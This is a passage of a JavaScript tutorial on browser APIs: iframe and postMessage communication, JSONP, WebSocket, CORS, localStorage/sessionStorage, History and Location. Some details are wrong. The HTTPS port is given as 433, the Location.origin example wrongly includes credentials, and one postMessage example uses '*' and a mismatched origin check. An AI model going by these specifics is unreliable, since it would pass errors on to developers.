
### 3. iframe and multi-window communication

The `iframe` element can embed other pages within the current page. Each `iframe` element forms its own window, that is, has its own `window` object. Scripts within an `iframe` window can obtain the parent window and child windows. However, only in the same-origin case can the parent window and child windows communicate; if it is cross-origin, you cannot obtain each other's DOM.

For example, if the parent window runs the following command and the `iframe` window is not same-origin, an error is thrown.

```js
document
.getElementById("myIFrame")
.contentWindow
.document
// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.
```

In the command above, the parent window wants to obtain the child window's DOM, and an error is thrown because it is cross-origin.

The reverse is also true: the child window obtaining the main window's DOM also throws an error.

```js
window.parent.document.body
// throws an error
```

This situation applies not only to `iframe` windows but also to windows opened by the `window.open` method; as long as it is cross-origin, the parent window and child window cannot communicate.

If two windows have the same first-level domain and differ only in their secondary domain, then setting the `document.domain` property introduced in the previous section allows working around the same-origin policy to obtain the DOM.

For sites that are completely non-same-origin, there are currently two methods to solve the cross-origin window communication problem.

> - Fragment identifier
> - Cross-document messaging API

#### 3.1 Fragment identifier

The fragment identifier refers to the part of a URL after the `#` sign, such as the `#fragment` in `http://example.com/x.html#fragment`. If only the fragment identifier is changed, the page does not refresh.

The parent window can write information into the child window's fragment identifier.

```js
var src = originURL + '#' + data;
document.getElementById('myIFrame').src = src;
```

In the code above, the parent window writes the information to be passed into the iframe window's fragment identifier.

The child window is notified by listening for the `hashchange` event.

```js
window.onhashchange = checkMessage;

function checkMessage() {
  var message = window.location.hash;
  // ...
}
```

Similarly, the child window can also change the parent window's fragment identifier.

```js
parent.location.href = target + '#' + hash;
```

#### 3.2 window.postMessage()

The method above is a hack; to solve this problem, HTML5 introduced a brand-new API: the cross-document messaging API.

This API adds a new `window.postMessage` method to the `window` object, allowing cross-window communication regardless of whether the two windows are same-origin. For example, for the parent window `aaa.com` to send a message to the child window `bbb.com`, you just call the `postMessage` method.

```js
// the parent window opens a child window
var popup = window.open('http://bbb.com', 'title');
// the parent window sends a message to the child window
popup.postMessage('Hello World!', 'http://bbb.com');
```

The first argument of the `postMessage` method is the actual message content, and the second argument is the origin of the window receiving the message, that is, "protocol + domain + port". It can also be set to `*`, indicating no domain restriction, sending to all windows.

The way the child window sends a message to the parent window is similar.

```js
// the child window sends a message to the parent window
window.opener.postMessage('Nice to see you', 'http://aaa.com');
```

Both the parent window and the child window can listen for each other's messages via the `message` event.

```js
// both the parent window and the child window can use the following code
// to listen for message messages
window.addEventListener('message', function (e) {
  console.log(e.data);
},false);
```

The argument of the `message` event is the event object `event`, which provides the following three properties.

> - `event.source`: the window that sent the message
> - `event.origin`: the URL the message was sent to
> - `event.data`: the message content

The example below shows the child window referencing the parent window via the `event.source` property and then sending a message.

```js
window.addEventListener('message', receiveMessage);
function receiveMessage(event) {
  event.source.postMessage('Nice to see you!', '*');
}
```

There are several things to note about the code above. First, the `receiveMessage` function does not filter the source of the message, so messages from any URL will be processed. Second, the target window's URL specified in the `postMessage` method is an asterisk, meaning the message can be sent to any URL. Generally speaking, these two practices are not recommended, because they are not secure enough and may be maliciously exploited.

The `event.origin` property can filter out messages not sent to this window.

```js
window.addEventListener('message', receiveMessage);
function receiveMessage(event) {
  if (event.origin !== 'http://aaa.com') return;
  if (event.data === 'Hello World') {
    event.source.postMessage('Hello', event.origin);
  } else {
    console.log(event.data);
  }
}
```



#### 3.3 LocalStorage

Through `window.postMessage`, reading and writing other windows' LocalStorage also becomes possible.

Below is an example where the main window writes to the iframe child window's `localStorage`.

```js
window.onmessage = function(e) {
  if (e.origin !== 'http://bbb.com') {
    return;
  }
  var payload = JSON.parse(e.data);
  localStorage.setItem(payload.key, JSON.stringify(payload.data));
};
```

In the code above, the child window writes the message sent by the parent window into its own LocalStorage.

The code for the parent window to send a message is as follows.

```js
var win = document.getElementsByTagName('iframe')[0].contentWindow;
var obj = { name: 'Jack' };
win.postMessage(
  JSON.stringify({key: 'storage', data: obj}),
  'http://bbb.com'
);
```

The enhanced version of the code for the child window to receive messages is as follows.

```js
window.onmessage = function(e) {
  if (e.origin !== 'http://bbb.com') return;
  var payload = JSON.parse(e.data);
  switch (payload.method) {
    case 'set':
      localStorage.setItem(payload.key, JSON.stringify(payload.data));
      break;
    case 'get':
      var parent = window.parent;
      var data = localStorage.getItem(payload.key);
      parent.postMessage(data, 'http://aaa.com');
      break;
    case 'remove':
      localStorage.removeItem(payload.key);
      break;
  }
};
```

The enhanced version of the code for the parent window to send messages is as follows.

```js
var win = document.getElementsByTagName('iframe')[0].contentWindow;
var obj = { name: 'Jack' };
// store the object
win.postMessage(
  JSON.stringify({key: 'storage', method: 'set', data: obj}),
  'http://bbb.com'
);
// read the object
win.postMessage(
  JSON.stringify({key: 'storage', method: "get"}),
  "*"
);
window.onmessage = function(e) {
  if (e.origin != 'http://aaa.com') return;
  console.log(JSON.parse(e.data).name);
};
```



### 4. AJAX

The same-origin policy stipulates that AJAX requests can only be sent to same-origin URLs, otherwise an error is thrown.

Besides setting up a server proxy (the browser requests a same-origin server, which then requests the external service), there are three methods to work around this restriction.

> - JSONP
> - WebSocket
> - CORS



#### 4.1 JSONP

JSONP is a common method for cross-origin communication between the server and the client. Its biggest feature is that it is simple and easy to use, has no compatibility issues, is supported by all older browsers, and requires very little server-side modification.

Its approach is as follows.

First, the page adds a `  <script>  ` element to request a script from the server; this is not subject to the same-origin policy restriction and can be a cross-origin request.

```html
<script src="http://api.foo.com?callback=bar"></script>
```

Note that the requested script URL has a `callback` parameter (`?callback=bar`), used to tell the server the name of the client's callback function (`bar`).

Second, after the server receives the request, it concatenates a string, placing the JSON data inside the function name and returning it as a string (`bar({...})`).

Third, the client parses the string returned by the server as code, because the browser considers this to be the script content requested by the `  <script>  ` tag. At this point, as long as the client has defined the `bar()` function, it can obtain the JSON data returned by the server within that function body.

Let's look at an example below. First, the page dynamically inserts a `  <script>  ` element, which makes a request to the cross-origin URL.

```js
function addScriptTag(src) {
  var script = document.createElement('script');
  script.setAttribute('type', 'text/javascript');
  script.src = src;
  document.body.appendChild(script);
}

window.onload = function () {
  addScriptTag('http://example.com/ip?callback=foo');
}

function foo(data) {
  console.log('Your public IP address is: ' + data.ip);
};
```

The code above makes a request to the server `example.com` by dynamically adding a `  <script>  ` element. Note that the request's query string has a `callback` parameter, used to specify the name of the callback function, which is required for JSONP.

After the server receives this request, it returns the data in the argument position of the callback function.

```js
foo({
  'ip': '8.8.8.8'
});
```

Since the script requested by the `  <script>  ` element runs directly as code, at this point, as long as the browser has defined the `foo` function, that function is called immediately. The JSON data passed as an argument is treated as a JavaScript object rather than a string, thus avoiding the step of using `JSON.parse`.



#### 4.2 WebSocket

WebSocket is a **communication protocol** that uses `ws://` (unencrypted) and `wss://` (encrypted) as protocol prefixes. **This protocol does not enforce the same-origin policy; as long as the server supports it, you can use it for cross-origin communication**.

Below is an example of the headers of a WebSocket request sent by the browser (taken from [Wikipedia](https://en.wikipedia.org/wiki/WebSocket)).

```js
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
Origin: http://example.com
```

In the code above, there is a field `Origin` that indicates the origin of the request, that is, which domain it was sent from.

It is precisely because of the `Origin` field that WebSocket does not enforce the same-origin policy. Because the server can, based on this field, determine whether to permit this communication. If the domain is in the whitelist, the server responds as follows.

```js
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
Sec-WebSocket-Protocol: chat
```



#### 4.3 CORS

CORS is the abbreviation for **Cross-Origin Resource Sharing**. It is a W3C standard and is the fundamental solution for cross-origin AJAX requests. Compared with JSONP, which can only send `GET` requests, CORS allows any type of request.

The next chapter will introduce in detail how to complete cross-origin AJAX requests via CORS.



## 7. CORS Communication

 CORS is a W3C standard whose full name is "**Cross-origin resource sharing**". It allows the browser to send `XMLHttpRequest` requests to cross-origin servers, thereby overcoming the restriction that AJAX can only be used same-origin.

### 1. Introduction

**CORS requires both the browser and the server to support it**. Currently, all browsers support this feature.

The entire CORS communication process is completed automatically by the browser, without requiring user participation. For developers, CORS communication is no different from ordinary AJAX communication; the code is exactly the same. Once the browser discovers that an AJAX request is cross-origin, it automatically adds some additional headers, and sometimes also makes one extra additional request, but the user is not aware of it. Therefore, **the key to implementing CORS communication is the server**. As long as the server implements the CORS interface, cross-origin communication is possible.



### 2. Two kinds of requests

CORS requests fall into two categories: simple requests and not-so-simple requests.

A request is a simple request as long as it satisfies both of the following two major conditions.

(1) The request method is one of the following three methods.

> - HEAD
> - GET
> - POST

(2) The HTTP headers do not exceed the following fields.

> - Accept
> - Accept-Language
> - Content-Language
> - Last-Event-ID
> - Content-Type: limited to three values `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

Any request that does not satisfy both of the above conditions is a not-so-simple request. In one sentence, **a simple request is the combination of a simple HTTP method and simple HTTP headers.**

The reason for dividing them this way is that forms have historically always been able to make cross-origin requests. A simple request is a form request; the browser follows the traditional handling approach without complicating the behavior, otherwise developers might turn to using forms to work around the CORS restriction. For not-so-simple requests, the browser adopts a new handling approach.



### 3. Simple requests

#### 3.1 Basic flow

For a simple request, the browser sends the CORS request directly. Specifically, it adds an `Origin` field to the headers.

Below is an example: the browser discovers that this cross-origin AJAX request is a simple request, and automatically adds an `Origin` field to the headers.

```js
GET /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

In the headers above, the `Origin` field is used to indicate which origin this request comes from (protocol + domain + port). The server decides whether to permit this request based on this value.

If the origin specified by `Origin` is not within the permitted range, the server returns a normal HTTP response. When the browser finds that this response's headers do not contain the `Access-Control-Allow-Origin` field (see below for details), it knows an error occurred, and thus throws an error, which is caught by the `onerror` callback of `XMLHttpRequest`. Note that this kind of error cannot be identified by the status code, because the HTTP response's status code may be 200.

If the domain specified by `Origin` is within the permitted range, the response returned by the server will have several additional header fields.

```js
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: FooBar
Content-Type: text/html; charset=utf-8
```

In the headers above, there are three fields related to the CORS request, all starting with `Access-Control-`.

**(1) `Access-Control-Allow-Origin`**

This field is required. Its value is either the value of the `Origin` field at request time, or a `*`, indicating that requests from any domain are accepted.

**(2) `Access-Control-Allow-Credentials`**

This field is optional. Its value is a boolean value indicating whether sending cookies is allowed. By default, cookies are not included in CORS requests. Setting it to `true` means the server explicitly permits the browser to include cookies in the request and send them to the server. This value can only be set to `true`; if the server does not want the browser to send cookies, simply do not send this field.

**(3) `Access-Control-Expose-Headers`**

This field is optional. During a CORS request, the `getResponseHeader()` method of the `XMLHttpRequest` object can only obtain 6 basic fields returned by the server: `Cache-Control`, `Content-Language`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma`. If you want to obtain other fields, you must specify them in `Access-Control-Expose-Headers`. The example above specifies that `getResponseHeader('FooBar')` can return the value of the `FooBar` field.



#### 3.2 The withCredentials property

As mentioned above, CORS requests by default do not include cookie information (or HTTP authentication information, etc.), which is to reduce the risk of CSRF attacks. But in some situations, the server may need to obtain cookies, in which case the server needs to explicitly specify the `Access-Control-Allow-Credentials` field to tell the browser that cookies can be sent.

```js
Access-Control-Allow-Credentials: true
```

At the same time, the developer must enable the `withCredentials` property in the AJAX request.

```js
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
```

Otherwise, even if the server requests sending cookies, the browser will not send them. Or, even if the server requests setting cookies, the browser will not process them.

However, some browsers set the `withCredentials` property to `true` by default. This results in those browsers possibly still sending cookies even if the `withCredentials` setting is omitted. In that case, you can explicitly turn off `withCredentials`.

```js
xhr.withCredentials = false;
```

Note that if the server requests the browser to send cookies, `Access-Control-Allow-Origin` cannot be set to an asterisk and must specify an explicit domain that matches the requesting page. At the same time, cookies still follow the same-origin policy: only cookies set with the server's domain are uploaded, cookies of other domains are not uploaded, and `document.cookie` in the (cross-origin) original page code also cannot read cookies under the server's domain.



### 4. Not-so-simple requests

#### 4.1 Preflight requests

A not-so-simple request is the kind of request that makes special demands on the server, for example, the request method is `PUT` or `DELETE`, or the `Content-Type` field's type is `application/json`.

A CORS request that is not-so-simple adds an HTTP query request before the formal communication, called a "preflight" request. The browser first asks the server whether the domain where the current page resides is in the server's permitted list, and which HTTP methods and header fields can be used. Only upon receiving an affirmative answer does the browser send the formal `XMLHttpRequest` request; otherwise an error is thrown. This is to prevent these newly added requests from placing pressure on traditional servers without CORS support, giving the server an opportunity to refuse in advance, which prevents the server from receiving a large number of `DELETE` and `PUT` requests that traditional forms could not possibly send cross-origin.

Below is a piece of browser JavaScript script.

```js
var url = 'http://api.alice.com/cors';
var xhr = new XMLHttpRequest();
xhr.open('PUT', url, true);
xhr.setRequestHeader('X-Custom-Header', 'value');
xhr.send();
```

In the code above, the HTTP request method is `PUT`, and it sends a custom header `X-Custom-Header`.

When the browser finds that this is a not-so-simple request, it automatically sends a "preflight" request, asking the server to confirm that such a request is allowed. Below are the HTTP headers of this "preflight" request.

```js
OPTIONS /cors HTTP/1.1
Origin: http://api.bob.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

The request method used by the "preflight" request is `OPTIONS`, indicating that this request is for inquiry. In the headers, the key field is `Origin`, indicating which origin the request comes from.

Besides the `Origin` field, the "preflight" request's headers include two special fields.

**(1) `Access-Control-Request-Method`**

This field is required and lists which HTTP methods the browser's CORS request will use; in the example above it is `PUT`.

**(2) `Access-Control-Request-Headers`**

This field is a comma-separated string specifying the additional header fields the browser's CORS request will send; in the example above it is `X-Custom-Header`.



#### 4.2 The response to the preflight request

After the server receives the "preflight" request and checks the `Origin`, `Access-Control-Request-Method`, and `Access-Control-Request-Headers` fields, if it confirms that the cross-origin request is allowed, it can respond.

```js
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-Custom-Header
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Content-Length: 0
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain
```

In the HTTP response above, the key field is `Access-Control-Allow-Origin`, indicating that `http://api.bob.com` can request data. This field can also be set to an asterisk, indicating that any cross-origin request is permitted.

```js
Access-Control-Allow-Origin: *
```

If the server denies the "preflight" request, it returns a normal HTTP response, but without any CORS-related header fields, or explicitly indicating that the request does not meet the conditions.

```js
OPTIONS http://api.bob.com HTTP/1.1
Status: 200
Access-Control-Allow-Origin: https://notyourdomain.com
Access-Control-Allow-Method: POST
```

In the server response above, the `Access-Control-Allow-Origin` field explicitly does not include the requesting `http://api.bob.com`.

At this point, the browser determines that the server does not agree to the preflight request, and therefore triggers an error, which is caught by the `onerror` callback of the `XMLHttpRequest` object. The console prints the following error message.

```js
XMLHttpRequest cannot load http://api.alice.com.
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
```

The other CORS-related fields in the server response are as follows.

```js
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1728000
```

**(1) `Access-Control-Allow-Methods`**

This field is required; its value is a comma-separated string indicating all the cross-origin request methods the server supports. Note that it returns all supported methods, not just the one method the browser requested. This is to avoid multiple "preflight" requests.

**(2) `Access-Control-Allow-Headers`**

If the browser request includes the `Access-Control-Request-Headers` field, then the `Access-Control-Allow-Headers` field is required. It is also a comma-separated string indicating all the header fields the server supports, not limited to the fields the browser requested in the "preflight".

**(3) `Access-Control-Allow-Credentials`**

This field has the same meaning as for simple requests.

**(4) `Access-Control-Max-Age`**

This field is optional and is used to specify the validity period of this preflight request, in seconds. In the result above, the validity period is 20 days (1728000 seconds), that is, this response is allowed to be cached for 1728000 seconds (i.e., 20 days), during which no other preflight request needs to be sent.



#### 4.3 The browser's normal requests and responses

Once the server passes the "preflight" request, every subsequent normal CORS request from the browser, just like a simple request, will have an `Origin` header field. The server's responses will also all have an `Access-Control-Allow-Origin` header field.

Below is the browser's normal CORS request after the "preflight" request.

```js
PUT /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
X-Custom-Header: value
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

The `Origin` field in the headers above is automatically added by the browser.

Below is the server's normal response.

```js
Access-Control-Allow-Origin: http://api.bob.com
Content-Type: text/html; charset=utf-8
```

In the headers above, the `Access-Control-Allow-Origin` field is necessarily included in every response.



### 5. Comparison with JSONP

CORS has the same purpose as JSONP but is more powerful than JSONP. JSONP only supports `GET` requests, while CORS supports all types of HTTP requests. JSONP's advantage lies in supporting older browsers, as well as being able to request data from sites that do not support CORS.



## 8. The Storage Interface

### 1. Overview

The Storage interface is used by scripts to save data in the browser. Two objects implement this interface: `window.sessionStorage` and `window.localStorage`.

The data saved by `sessionStorage` is used for one browser session; when the session ends (usually when the window is closed), the data is cleared. The data saved by `localStorage` persists long-term, and the next time the site is visited, the page can directly read the previously saved data. Apart from the difference in the length of the retention period, these two objects are identical in all other respects.

The saved data all exists in the form of "key-value pairs." That is, each data item has a key name and a corresponding value. All data is saved in text format.

This interface is much like an enhanced version of cookies, able to use much larger storage space. Currently, the storage limit for each domain depends on the browser: Chrome is 2.5MB, Firefox and Opera are 5MB, and IE is 10MB. Among them, Firefox's storage space is determined by the first-level domain, whereas other browsers do not have this limitation. That is, in Firefox, `a.example.com` and `b.example.com` share 5MB of storage space. In addition, like cookies, they are also subject to the same-domain restriction. Data stored by a page can only be read by pages under the same domain; cross-domain operations throw an error.



### 2. Properties and methods

The Storage interface has only one property.

- `Storage.length`: returns the number of saved data items.

```javascript
window.localStorage.setItem('foo', 'a');
window.localStorage.setItem('bar', 'b');
window.localStorage.setItem('baz', 'c');

window.localStorage.length // 3
```

This interface provides 5 methods.



#### 2.1 Storage.setItem()

The `Storage.setItem()` method is used to store data. It accepts two arguments: the first is the key name, and the second is the data to be saved. If the key name already exists, this method updates the existing value. This method has no return value.

```javascript
window.sessionStorage.setItem('key', 'value');
window.localStorage.setItem('key', 'value');
```

Note that both arguments of `Storage.setItem()` are strings. If they are not strings, they are automatically converted to strings before being stored in the browser.

```javascript
window.sessionStorage.setItem(3, { foo: 1 });
window.sessionStorage.getItem('3') // "[object Object]"
```

In the code above, neither of the two arguments of the `setItem` method is a string, but the stored values are both strings.

If the storage space is full, this method throws an error.

You do not necessarily have to use this method to write; direct assignment also works.

```javascript
// the following three forms are equivalent
window.localStorage.foo = '123';
window.localStorage['foo'] = '123';
window.localStorage.setItem('foo', '123');
```



#### 2.2 Storage.getItem()

The `Storage.getItem()` method is used to read data. It has only one argument, the key name. If the key name does not exist, this method returns `null`.

```javascript
window.sessionStorage.getItem('key')
window.localStorage.getItem('key')
```

The key name should be a string; otherwise it is automatically converted to a string.



#### 2.3 Storage.removeItem()

The `Storage.removeItem()` method is used to clear the value corresponding to a certain key name. It accepts the key name as an argument; if the key name does not exist, this method does nothing.

```javascript
sessionStorage.removeItem('key');
localStorage.removeItem('key');
```



#### 2.4 Storage.clear()

The `Storage.clear()` method is used to clear all saved data. The return value of this method is `undefined`.

```javascript
window.sessionStorage.clear()
window.localStorage.clear()
```



#### 2.5 Storage.key()

`Storage.key()` accepts an integer as an argument (starting from zero) and returns the key name at that position.

```javascript
window.sessionStorage.setItem('key', 'value');
window.sessionStorage.key(0) // "key"
```

By combining the `Storage.length` property and the `Storage.key()` method, you can iterate over all the keys.

```javascript
for (var i = 0; i < window.localStorage.length; i++) {
  console.log(localStorage.key(i));
}
```



### 3. The storage event

When the data stored by the Storage interface changes, the storage event is triggered, and you can specify a listener function for this event.

```javascript
window.addEventListener('storage', onStorageChange);
```

The listener function accepts an `event` instance object as an argument. This instance object inherits the StorageEvent interface and has several unique properties, all of which are read-only.

- `StorageEvent.key`: a string representing the key name that changed. If the storage event was caused by the `clear()` method, this property returns `null`.
- `StorageEvent.newValue`: a string representing the new value. If the storage event was caused by the `clear()` method or by deleting the key-value pair, this property returns `null`.
- `StorageEvent.oldValue`: a string representing the old value. If the key-value pair is newly added, this property returns `null`.
- `StorageEvent.storageArea`: an object that returns the entire object containing the key-value pairs. In other words, from this property you can obtain all the key-value pairs stored under the current domain.
- `StorageEvent.url`: a string representing the URL of the page that originally triggered the storage event.

Below is an example of the `StorageEvent.key` property.

```javascript
function onStorageChange(e) {
  console.log(e.key);
}

window.addEventListener('storage', onStorageChange);
```

Note that this event has a very special characteristic: it is not triggered on the current page that caused the data change, but on other windows of the same domain. In other words, if the browser has only one window open, you may not be able to observe this event. For example, with multiple windows open at the same time, when one of the windows causes the stored data to change, the execution of the listener function can only be observed in the other windows. Through this mechanism, communication between multiple windows can be achieved.



## 9. The History Object

### 1. Overview

The `window.history` property points to the History object, which represents the browsing history of the current window.

The History object stores the URLs of all pages visited by the current window. The code below indicates that the current window has visited a total of 3 URLs.

```js
window.history.length // 3
```

For security reasons, the browser does not allow scripts to read these addresses, but does allow navigating between addresses.

```js
// go back to the previous URL
history.back()

// equivalent to
history.go(-1)
```

The "Forward" and "Back" buttons in the browser toolbar actually operate on the History object.



### 2. Properties

The History object has two main properties.

- `History.length`: the number of URLs the current window has visited (including the current page)
- `History.state`: the state value at the top of the History stack (see below for details)

```js
// how many pages the current window has visited
window.history.length // 1

// the current state of the History object
// usually undefined, i.e. not set
window.history.state // undefined
```



### 3. Methods

#### 3.1 History.back(), History.forward(), History.go()

These three methods are used to move within the history.

- `History.back()`: moves to the previous URL, equivalent to clicking the browser's back button. For the first visited URL, this method has no effect.
- `History.forward()`: moves to the next URL, equivalent to clicking the browser's forward button. For the last visited URL, this method has no effect.
- `History.go()`: accepts an integer as an argument and, relative to the current URL, moves to the URL specified by the argument; for example, `go(1)` is equivalent to `forward()`, and `go(-1)` is equivalent to `back()`. If the argument exceeds the range of URLs that actually exist, this method has no effect; if no argument is specified, the default argument is `0`, which is equivalent to refreshing the current page.

```js
history.back();
history.forward();
history.go(-2);
```

`history.go(0)` is equivalent to refreshing the current page.

```js
history.go(0); // refresh the current page
```

Note that when moving to a previously visited page, the page is usually loaded from the browser cache rather than re-requesting a new page from the server.



#### 3.2 History.pushState()

The `History.pushState()` method is used to add a record to the history.

```js
window.history.pushState(state, title, url)
```

This method accepts three arguments, in order:

- `state`: a state object associated with the added record, mainly used for the `popstate` event. When this event is triggered, this object is passed to the callback function. In other words, the browser serializes this object and keeps it locally, and when this page is reloaded, this object can be obtained. If this object is not needed, you can fill in `null` here.
- `title`: the title of the new page. However, all browsers now ignore this argument, so you can fill in an empty string here.
- `url`: the new URL, which must be in the same domain as the current page. The browser's address bar will display this URL.

Assume the current URL is `example.com/1.html`, and use the `pushState()` method to add a new record to the browsing history (the History object).

```js
var stateObj = { foo: 'bar' };
history.pushState(stateObj, 'page 2', '2.html');
```

After adding the new record, the browser's address bar immediately displays `example.com/2.html`, but it does not navigate to `2.html`, nor does it even check whether `2.html` exists; it simply becomes the latest record in the browsing history. At this point, if you enter a new address in the address bar (for example, visit `google.com`) and then click the back button, the page's URL will display `2.html`; if you click the back button once more, the URL will display `1.html`.

In short, the `pushState()` method does not trigger a page refresh; it only causes the History object to change, and the address bar reacts.

After using this method, you can read out the state object via the `History.state` property.

```js
var stateObj = { foo: 'bar' };
history.pushState(stateObj, 'page 2', '2.html');
history.state // {foo: "bar"}
```

If the URL argument of `pushState` sets a new anchor value (that is, `hash`), it does not trigger the `hashchange` event. Conversely, if the URL's anchor value changes, a browsing record is created in the History object.

If the `pushState()` method sets a cross-origin URL, an error is thrown.

```js
// throws an error
// the current URL is http://example.com
history.pushState(null, '', 'https://twitter.com/hello');
```

In the code above, `pushState` wants to insert a cross-origin URL, which causes an error. The purpose of this design is to prevent malicious code from making users think they are on another site, since this method does not cause the page to navigate.

#### 3.3 History.replaceState()

The `History.replaceState()` method is used to modify the current record of the History object; everything else is exactly the same as the `pushState()` method.

Assume the current page is `example.com/example.html`.

```js
history.pushState({page: 1}, 'title 1', '?page=1')
// URL displays as http://example.com/example.html?page=1

history.pushState({page: 2}, 'title 2', '?page=2');
// URL displays as http://example.com/example.html?page=2

history.replaceState({page: 3}, 'title 3', '?page=3');
// URL displays as http://example.com/example.html?page=3

history.back()
// URL displays as http://example.com/example.html?page=1

history.back()
// URL displays as http://example.com/example.html

history.go(2)
// URL displays as http://example.com/example.html?page=3
```



### 4. The popstate event

Whenever the browsing history of the same document (that is, the `history` object) changes, the `popstate` event is triggered.

Note that merely calling the `pushState()` method or the `replaceState()` method does not trigger this event; it is only triggered when the user clicks the browser's back and forward buttons, or uses JavaScript to call the `History.back()`, `History.forward()`, or `History.go()` methods. In addition, this event only applies to the same document; if switching the browsing history causes a different document to be loaded, this event is also not triggered.

When using it, you can specify a callback function for the `popstate` event.

```js
window.onpopstate = function (event) {
  console.log('location: ' + document.location);
  console.log('state: ' + JSON.stringify(event.state));
};

// or
window.addEventListener('popstate', function(event) {
  console.log('location: ' + document.location);
  console.log('state: ' + JSON.stringify(event.state));
});
```

The argument of the callback function is an `event` event object, whose `state` property points to the state object provided for the current URL by the `pushState` and `replaceState` methods (that is, the first argument of these two methods). The `event.state` in the code above is the `state` object bound to the current URL via the `pushState` and `replaceState` methods.

This `state` object can also be read directly via the `history` object.

```js
var currentState = history.state;
```

Note that when the page is loaded for the first time, the browser does not trigger the `popstate` event.



## 10. Location Object, URL Object, and URLSearchParams Object

 The URL is one of the fundamental infrastructures of the internet. The browser provides some native objects for managing URLs.

### 1. The Location object

The `Location` object is a native object provided by the browser that offers URL-related information and operation methods. You can obtain this object via the `window.location` and `document.location` properties.

#### 1.1 Properties

The `Location` object provides the following properties.

- `Location.href`: the entire URL.
- `Location.protocol`: the protocol of the current URL, including the colon (`:`).
- `Location.host`: the host. If the port is not the protocol's default `80` or `433`, it also includes the colon (`:`) and the port.
- `Location.hostname`: the hostname, not including the port.
- `Location.port`: the port number.
- `Location.pathname`: the path part of the URL, starting from the root path `/`.
- `Location.search`: the query string part, starting from the question mark `?`.
- `Location.hash`: the fragment string part, starting from `#`.
- `Location.username`: the username before the domain.
- `Location.password`: the password before the domain.
- `Location.origin`: the protocol, hostname, and port of the URL.

```js
// the current URL is
// http://user:passwd@www.example.com:4097/path/a.html?x=111#part1
document.location.href
// "http://user:passwd@www.example.com:4097/path/a.html?x=111#part1"
document.location.protocol
// "http:"
document.location.host
// "www.example.com:4097"
document.location.hostname
// "www.example.com"
document.location.port
// "4097"
document.location.pathname
// "/path/a.html"
document.location.search
// "?x=111"
document.location.hash
// "#part1"
document.location.username
// "user"
document.location.password
// "passwd"
document.location.origin
// "http://user:passwd@www.example.com:4097"
```

Among these properties, only the `origin` property is read-only; all other properties are writable.

Note that if you write a new URL address to `Location.href`, the browser immediately navigates to this new address.

```js
// navigate to a new URL
document.location.href = 'http://www.example.com';
```

This feature is often used to make the page automatically scroll to a new anchor.

```js
document.location.href = '#top';
// equivalent to
document.location.hash = '#top';
```

Directly rewriting `location` is equivalent to writing the `href` property.

```js
document.location = 'http://www.example.com';
// equivalent to
document.location.href = 'http://www.example.com';
```

In addition, the `Location.href` property is the only property the browser allows to be written cross-origin, that is, a non-same-origin window can rewrite another window's (for example, a child window's and parent window's) `Location.href` property, causing the latter's URL to navigate. None of the other properties of `Location` are allowed to be written cross-origin.



#### 1.2 Methods

**(1) Location.assign()**

The `assign` method accepts a URL string as an argument, causing the browser to immediately navigate to the new URL. If the argument is not a valid URL string, an error is thrown.

```js
// navigate to a new URL
document.location.assign('http://www.example.com')
```

**(2) Location.replace()**

The `replace` method accepts a URL string as an argument, causing the browser to immediately navigate to the new URL. If the argument is not a valid URL string, an error is thrown.

The difference from the `assign` method is that `replace` deletes the current URL from the browser's browsing history `History`; that is, once this method is used, the back button cannot return to the current page, which is equivalent to replacing the old URL with the new URL in the browsing history. One of its applications is that when a script discovers the current device is a mobile device, it immediately navigates to the mobile version of the page.

```js
// navigate to a new URL
document.location.replace('http://www.example.com')
```

**(3) Location.reload()**

The `reload` method causes the browser to reload the current URL, equivalent to pressing the browser's refresh button.

It accepts a boolean value as an argument. If the argument is `true`, the browser re-requests this page from the server, and after reloading, the page scrolls to the top (that is, `scrollTop === 0`). If the argument is `false` or empty, the browser reloads the page from the local cache, and after reloading, the page's viewport position is the position before reloading.

```js
// re-request the current URL from the server
window.location.reload(true);
```

**(4) Location.toString()**

The `toString` method returns the entire URL string, equivalent to reading the `Location.href` property.



### 2. URL encoding and decoding

A page's URL can only contain legal characters. Legal characters fall into two categories.

- URL metacharacters: semicolon (`;`), comma (`,`), slash (`/`), question mark (`?`), colon (`:`), at (`@`), `&`, equals sign (`=`), plus sign (`+`), dollar sign (`$`), hash (`#`)
- Semantic characters: `a-z`, `A-Z`, `0-9`, hyphen (`-`), underscore (`_`), dot (`.`), exclamation mark (`!`), tilde (`~`), asterisk (`*`), single quote (`'`), parentheses (`()`)

Apart from the above characters, all other characters appearing in a URL must be escaped. The rule is, based on the operating system's default encoding, to convert each byte into a percent sign (`%`) plus two uppercase hexadecimal letters.

